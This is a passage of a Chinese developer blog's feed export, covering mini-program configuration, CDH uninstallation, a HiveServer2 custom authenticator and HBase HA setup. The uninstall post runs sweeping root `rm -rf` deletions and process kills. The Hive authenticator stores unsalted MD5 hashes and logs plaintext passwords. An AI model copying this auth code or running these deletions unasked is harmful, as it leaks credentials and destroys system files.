<p>修改为上文中的方法即可，加上process的判断。这是因为一些只兼容客户端的脚本被打包进了服务端的执行脚本中去。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<p>![<a href="https://www.nuxtjs.cn/" target="_blank" rel="noopener">Nuxt.js - Vue.js 通用应用框架 | Nuxt.js 中文网 (nuxtjs.cn)</a>]</p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>小程序设置全局分享</title>
    <url>/2019/08/04/%E5%89%8D%E7%AB%AF/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E7%BD%AE%E5%85%A8%E5%B1%80%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<p>如题<br><a id="more"></a><br>在app.js中配置即可，设置全局分享页面</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> PageTmp = Page;</span><br><span class="line"></span><br><span class="line">  Page = <span class="function"><span class="keyword">function</span> (<span class="params">pageConfig</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 设置全局默认分享</span></span><br><span class="line">    pageConfig = <span class="built_in">Object</span>.assign(&#123;</span><br><span class="line">      onShareAppMessage: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          title: <span class="string">'点滴'</span>,</span><br><span class="line">          imageUrl: <span class="string">'/images/share.jpg'</span>,</span><br><span class="line">          path: <span class="string">'/pages/home/home/index'</span></span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, pageConfig);</span><br><span class="line"></span><br><span class="line">    PageTmp(pageConfig);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>小程序tab不显示</title>
    <url>/2019/08/04/%E5%89%8D%E7%AB%AF/%E5%B0%8F%E7%A8%8B%E5%BA%8Ftab%E4%B8%8D%E6%98%BE%E7%A4%BA/</url>
    <content><![CDATA[<p>配置好tabBar后页面不显示菜单.<br><a id="more"></a></p>
<p>必须要保证pages和tabbar顺序一致:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"pages"</span>: [</span><br><span class="line">    <span class="string">"pages/index/index"</span>,</span><br><span class="line">    <span class="string">"pages/home/home/index"</span>,</span><br><span class="line">    <span class="string">"pages/account/home/index"</span>,</span><br><span class="line">    <span class="string">"pages/statistic/home/index"</span>,</span><br><span class="line">    <span class="string">"pages/center/home/index"</span></span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">"tabBar"</span>: &#123;</span><br><span class="line">    <span class="attr">"list"</span>: [&#123;</span><br><span class="line">      <span class="attr">"pagePath"</span>: <span class="string">"pages/home/home/index"</span>,</span><br><span class="line">      <span class="attr">"text"</span>: <span class="string">"首页"</span>,</span><br><span class="line">      <span class="attr">"iconPath"</span>: <span class="string">"/static/images/bar/home.png"</span>,</span><br><span class="line">      <span class="attr">"selectedIconPath"</span>: <span class="string">"/static/images/bar/home-active.png"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"pagePath"</span>: <span class="string">"pages/account/home/index"</span>,</span><br><span class="line">      <span class="attr">"text"</span>: <span class="string">"记账"</span>,</span><br><span class="line">      <span class="attr">"iconPath"</span>: <span class="string">"/static/images/bar/account.png"</span>,</span><br><span class="line">      <span class="attr">"selectedIconPath"</span>: <span class="string">"/static/images/bar/account-active.png"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"pagePath"</span>: <span class="string">"pages/statistic/home/index"</span>,</span><br><span class="line">      <span class="attr">"text"</span>: <span class="string">"统计"</span>,</span><br><span class="line">      <span class="attr">"iconPath"</span>: <span class="string">"/static/images/bar/statistics.png"</span>,</span><br><span class="line">      <span class="attr">"selectedIconPath"</span>: <span class="string">"/static/images/bar/statistics-active.png"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"pagePath"</span>: <span class="string">"pages/center/home/index"</span>,</span><br><span class="line">      <span class="attr">"text"</span>: <span class="string">"个人中心"</span>,</span><br><span class="line">      <span class="attr">"iconPath"</span>: <span class="string">"/static/images/bar/user.png"</span>,</span><br><span class="line">      <span class="attr">"selectedIconPath"</span>: <span class="string">"/static/images/bar/user-active.png"</span></span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就可以显示菜单了,pages中第一个页面为启动页，可自行配置。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>CDH卸载(转)</title>
    <url>/2017/10/24/%E5%A4%A7%E6%95%B0%E6%8D%AE/CDH%E5%8D%B8%E8%BD%BD(%E8%BD%AC)/</url>
    <content><![CDATA[<h1 id="1-关闭集群中的所有服务。"><a href="#1-关闭集群中的所有服务。" class="headerlink" title="1. 关闭集群中的所有服务。"></a>1. 关闭集群中的所有服务。</h1><p> 这个可以通过clouder manger 主页关闭集群。</p>
<h1 id="2-卸载"><a href="#2-卸载" class="headerlink" title="2. 卸载"></a>2. 卸载</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># /usr/share/cmf/uninstall-cloudera-manager.sh </span></span><br><span class="line"></span><br><span class="line">[root@slave1 ~]<span class="comment"># service cloudera-scm-agent stop</span></span><br><span class="line">[root@slave1 ~]<span class="comment"># service cloudera-scm-agent stop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#一下都是所有要卸载的集群均要执行清除工作：</span></span><br><span class="line">[root@master ~]<span class="comment"># umount /var/run/cloudera-scm-agent/process</span></span><br><span class="line">[root@slave1 ~]<span class="comment"># umount /var/run/cloudera-scm-agent/process</span></span><br><span class="line">[root@slave2 ~]<span class="comment"># umount /var/run/cloudera-scm-agent/process</span></span><br><span class="line"></span><br><span class="line">[root@master ~]<span class="comment"># rm -rf /usr/share/cmf /var/lib/cloudera* /var/cache/yum/x86_64/6/cloudera* /var/log/cloudera* /var/run/cloudera*  /etc/cloudera*</span></span><br></pre></td></tr></table></figure>
<h1 id="3-卸载安装包"><a href="#3-卸载安装包" class="headerlink" title="3. 卸载安装包"></a>3. 卸载安装包</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@slave1 ~]<span class="comment"># rpm -qa | grep cloudera</span></span><br><span class="line">[root@slave2 ~]<span class="comment"># for f in `rpm -qa | grep cloudera `  ; do rpm -e $&#123;f&#125; ; done     #（如果有保存，在执行一遍）</span></span><br></pre></td></tr></table></figure>
<h1 id="4-清除安装文件"><a href="#4-清除安装文件" class="headerlink" title="4. 清除安装文件"></a>4. 清除安装文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master alternatives]<span class="comment"># rm -rf /var/lib/hadoop-* /var/lib/impala /var/lib/solr /var/lib/zookeeper /var/lib/hue /var/lib/oozie  /var/lib/pgsql  /var/lib/sqoop2  /data/dfs/  /data/impala/ /data/yarn/  /dfs/ /impala/ /yarn/  /var/run/hadoop-*/ /var/run/hdfs-*/ /usr/bin/hadoop* /usr/bin/zookeeper* /usr/bin/hbase* /usr/bin/hive* /usr/bin/hdfs /usr/bin/mapred /usr/bin/yarn /usr/bin/sqoop* /usr/bin/oozie /etc/hadoop* /etc/zookeeper* /etc/hive* /etc/hue /etc/impala /etc/sqoop* /etc/oozie /etc/hbase* /etc/hcatalog </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#只删除hadoop系列的，不要删除其他软件的，否则其他软件的版本控制会被破坏</span></span><br><span class="line">[root@master alternatives]<span class="comment"># rm -rf ` find /var/lib/alternatives/* ! -name "mta" ! -name "print" ! -name "zlibrary-ui"  -mtime -3` </span></span><br><span class="line">[root@master alternatives]<span class="comment"># rm -rf /etc/alternatives/*</span></span><br></pre></td></tr></table></figure>
<h1 id="5-杀死相关进程："><a href="#5-杀死相关进程：" class="headerlink" title="5. 杀死相关进程："></a>5. 杀死相关进程：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> hdfs mapred cloudera-scm hbase hue zookeeper oozie hive impala flume; <span class="keyword">do</span> sudo <span class="built_in">kill</span> $(ps -u <span class="variable">$u</span> -o pid=); <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h1 id="6-删除parcel包分发文件和解压文件"><a href="#6-删除parcel包分发文件和解压文件" class="headerlink" title="6. 删除parcel包分发文件和解压文件"></a>6. 删除parcel包分发文件和解压文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -rf /opt/cloudera/parcel-cache /opt/cloudera/parcels</span><br></pre></td></tr></table></figure>
<h1 id="到此卸载完毕。"><a href="#到此卸载完毕。" class="headerlink" title="到此卸载完毕。"></a>到此卸载完毕。</h1><h6 id="转自"><a href="#转自" class="headerlink" title="转自:"></a>转自:</h6><p>  <a href="http://blog.csdn.net/wulantian/article/details/42706777" target="_blank" rel="noopener">CDH5.X完全卸载步骤</a></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Could not locate executable winutils.exe in the Hadoop binaries</title>
    <url>/2019/04/12/%E5%A4%A7%E6%95%B0%E6%8D%AE/Could%20not%20locate%20executable%20winutils.exe%20in%20the%20Hadoop%20binaries/</url>
    <content><![CDATA[<p>windows上连接hadoop抛出如下异常.<br><img src="/2019/04/12/大数据/Could not locate executable winutils.exe in the Hadoop binaries/hadoop_20190412175916.png" alt><br><a id="more"></a><br><a href="https://github.com/steveloughran/winutils" target="_blank" rel="noopener">https://github.com/steveloughran/winutils</a><br>在windows上运行hadoop缺少winutils.exe,从上边的地址下载完成后将winutils.exe复制到hadoop bin目录中,设置好环境变量即可.<br><img src="/2019/04/12/大数据/Could not locate executable winutils.exe in the Hadoop binaries/winutils_20190412183622.png" alt></p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>HiveServer2自定义用户认证</title>
    <url>/2018/02/07/%E5%A4%A7%E6%95%B0%E6%8D%AE/HiveServer2%E8%87%AA%E5%AE%9A%E4%B9%89%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[<p>以前的命令行操作都是没有密码认证的,随意输入都可以连接到hiveserver。今天要解决这个问题,<br>通过自定义配置文件来指定用户可以访问hive server,仍然以Hive 2.3.0版本来说明.<br>Hive server2 提供了NOSASL, KERBEROS, LDAP, PAM , CUSTOM这几种方式来认证用户,此处以CUSTOM为例来说明,其他的方式参考官网实例.</p>
<h1 id="自定义认证"><a href="#自定义认证" class="headerlink" title="自定义认证"></a>自定义认证</h1><p>自定义认证需要实现PasswdAuthenticationProvider接口,从指定的配置文件中读取用户信息比较即可.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.xwolf.big.util.MD5;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hive.conf.HiveConf;</span><br><span class="line"><span class="keyword">import</span> org.apache.hive.service.auth.PasswdAuthenticationProvider;</span><br><span class="line"><span class="keyword">import</span> javax.security.sasl.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hive Server自定义认证</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.8</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HiveServerCustomeAuth</span> <span class="keyword">implements</span> <span class="title">PasswdAuthenticationProvider</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username 用户名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password 密码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> AuthenticationException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Authenticate</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> AuthenticationException </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> result = <span class="keyword">false</span>;</span><br><span class="line">        HiveConf hiveConf = <span class="keyword">new</span> HiveConf();</span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration(hiveConf);</span><br><span class="line">        String passMd5 = MD5.md5(password);</span><br><span class="line">        <span class="comment">//读取自定义配置文件</span></span><br><span class="line">        String filePath = conf.get(<span class="string">"hive.server2.custom.authentication.file"</span>);</span><br><span class="line">        File file = <span class="keyword">new</span> File(filePath);</span><br><span class="line">        <span class="keyword">try</span>(BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(file))) &#123;</span><br><span class="line">            String tempString;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">null</span> != (tempString = reader.readLine())) &#123;</span><br><span class="line">                String[] datas = tempString.split(<span class="string">","</span>);</span><br><span class="line">                <span class="keyword">if</span>(datas.length != <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(datas[<span class="number">0</span>].equals(username) &amp;&amp; datas[<span class="number">1</span>].equals(passMd5)) &#123;</span><br><span class="line">                    result = <span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result)&#123;</span><br><span class="line">                System.out.println(String.format(<span class="string">"[user]=%s,[password]=%s,authenticate success"</span>,username,password));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AuthenticationException(<span class="string">"User Authenticate Error,Maybe the configuration file has some error."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.8</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MD5</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span> hexDigits[] = &#123;<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MessageDigest digest = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] btInput = str.getBytes();</span><br><span class="line">            digest.reset();</span><br><span class="line">            digest.update(btInput);</span><br><span class="line">            <span class="keyword">byte</span>[] md = digest.digest();</span><br><span class="line">            <span class="comment">// 把密文转换成十六进制的字符串形式</span></span><br><span class="line">            <span class="keyword">int</span> j = md.length;</span><br><span class="line">            <span class="keyword">char</span> strChar[] = <span class="keyword">new</span> <span class="keyword">char</span>[j * <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; j; i++) &#123;</span><br><span class="line">                <span class="keyword">byte</span> byte0 = md[i];</span><br><span class="line">                strChar[k++] = hexDigits[byte0 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">0xf</span>];</span><br><span class="line">                strChar[k++] = hexDigits[byte0 &amp; <span class="number">0xf</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(strChar);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>hive.site.xml配置如下信息:</p>
<p>修改hive.server2.authentication 为CUSTOM,<br>hive.server2.custom.authentication.class指定为自定义类.</p>
<p>配置文件属性新增即可.<br>user.conf 文件内容为K,V信息,对应用户的用户名和密码.</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--认证类型默认NONE.有如下选项: NONE (uses plain SASL), NOSASL, KERBEROS, LDAP, PAM , CUSTOM.--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.authentication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>CUSTOM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--自定义认证类--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.custom.authentication.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>com.xwolf.big.hive.HiveServerCustomeAuth<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--配置文件位置,新增此属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.custom.authentication.file<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/hadoop/hive-2.3.0/conf/users.conf<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>同样是打包上传到Hive lib目录下,重启Hive.只有输入正确的用户名和密码才能链接进入beeline.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 认证失败会抛出异常信息</span></span></span><br><span class="line"></span><br><span class="line">javax.security.sasl.AuthenticationException</span><br><span class="line">	at com.xwolf.big.hive.HiveServerCustomeAuth.Authenticate(HiveServerCustomeAuth.java:50)</span><br><span class="line">	at org.apache.hive.service.auth.CustomAuthenticationProviderImpl.Authenticate(CustomAuthenticationProviderImpl.java:54)</span><br><span class="line">	at org.apache.hive.service.auth.PlainSaslHelper$PlainServerCallbackHandler.handle(PlainSaslHelper.java:107)</span><br><span class="line">	at org.apache.hive.service.auth.PlainSaslServer.evaluateResponse(PlainSaslServer.java:103)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 认证成功,打印出对应的用户信息</span></span></span><br><span class="line"></span><br><span class="line">[user]=root,[password]=root1234,authenticate success</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://cwiki.apache.org/confluence/display/Hive/Setting+Up+HiveServer2#SettingUpHiveServer2-Configuration" target="_blank" rel="noopener">Hive官网Hive server认证</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title>Hbase HA 环境搭建</title>
    <url>/2017/10/24/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hbase%20HA%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<blockquote>
<p>一、JAVA安装环境变量配置</p>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shell<sup><a href="#fn_code" id="reffn_code">code</a></sup></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">安装</span></span><br><span class="line">rpm -ivh jdk-8u144-linux-x64.rpm</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置环境变量</span></span><br><span class="line">vi /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">新增如下内容</span></span><br><span class="line">export JAVA_HOME=/usr/java/jdk1.8.1_44/</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">生效</span></span><br><span class="line">source /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">验证</span></span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>
<p>二、Hadoop 环境搭建</p>
</blockquote>
<p>参考： <a href="http://snowxwolf.gitee.io/xwolf.oschina.io/2017/10/25/Hadoop%20HA%20%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">Haoop HA 环境搭建</a></p>
<blockquote>
<p>三、Hbase 安装配置</p>
<h1 id="3-1-基础配置"><a href="#3-1-基础配置" class="headerlink" title="3.1 基础配置"></a>3.1 基础配置</h1></blockquote>
<p>hbase-env.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#java路径</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=</span><br><span class="line"></span><br><span class="line"><span class="comment">#hbase classpath</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> HBASE_CLASSPATH=/opt/hadoop/hbase-1.3.1/lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不用hbase自己的实例来管理ZK</span></span><br><span class="line"><span class="built_in">export</span> HBASE_MANAGES_ZK=<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>hbase-site.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--开启分布式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--hdfs数据目录--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop01:9000/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- zk 集群信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop01,hadoop02,hadoop03<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.sission.timeout<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>60000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--zk 端口--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.property.clientPort<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>2181<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.property.dataDir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/datas/hbase/zookeeper<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>regionserver</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop03</span><br><span class="line">hadoop04</span><br><span class="line">hadoop05</span><br></pre></td></tr></table></figure>
<p>backup-masters，备份主机<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop01</span><br><span class="line">hadoop02</span><br></pre></td></tr></table></figure></p>
<p>至此配置成功，将文件夹分发到其他服务器上。</p>
<blockquote>
<h1 id="3-2-可能出现的问题"><a href="#3-2-可能出现的问题" class="headerlink" title="3.2 可能出现的问题"></a>3.2 可能出现的问题</h1><h4 id="3-2-1-org-apache-hadoop-hbase-ipc-RemoteWithExtrasException-org-apache-hadoop-hbase-ClockOutOfSyncException-org-apache-hadoop-hbase-ClockOutOfSyncException-Server-hadoop04-16020-1509015701557-has-been-rejected-Reported-time-is-too-far-out-of-sync-with-master-Time-difference-of-86399223ms-gt-max-allowed-of-30000ms"><a href="#3-2-1-org-apache-hadoop-hbase-ipc-RemoteWithExtrasException-org-apache-hadoop-hbase-ClockOutOfSyncException-org-apache-hadoop-hbase-ClockOutOfSyncException-Server-hadoop04-16020-1509015701557-has-been-rejected-Reported-time-is-too-far-out-of-sync-with-master-Time-difference-of-86399223ms-gt-max-allowed-of-30000ms" class="headerlink" title="3.2.1 org.apache.hadoop.hbase.ipc.RemoteWithExtrasException(org.apache.hadoop.hbase.ClockOutOfSyncException): org.apache.hadoop.hbase.ClockOutOfSyncException: Server hadoop04,16020,1509015701557 has been rejected; Reported time is too far out of sync with master.  Time difference of 86399223ms &gt; max allowed of 30000ms"></a>3.2.1 org.apache.hadoop.hbase.ipc.RemoteWithExtrasException(org.apache.hadoop.hbase.ClockOutOfSyncException): org.apache.hadoop.hbase.ClockOutOfSyncException: Server hadoop04,16020,1509015701557 has been rejected; Reported time is too far out of sync with master.  Time difference of 86399223ms &gt; max allowed of 30000ms</h4></blockquote>
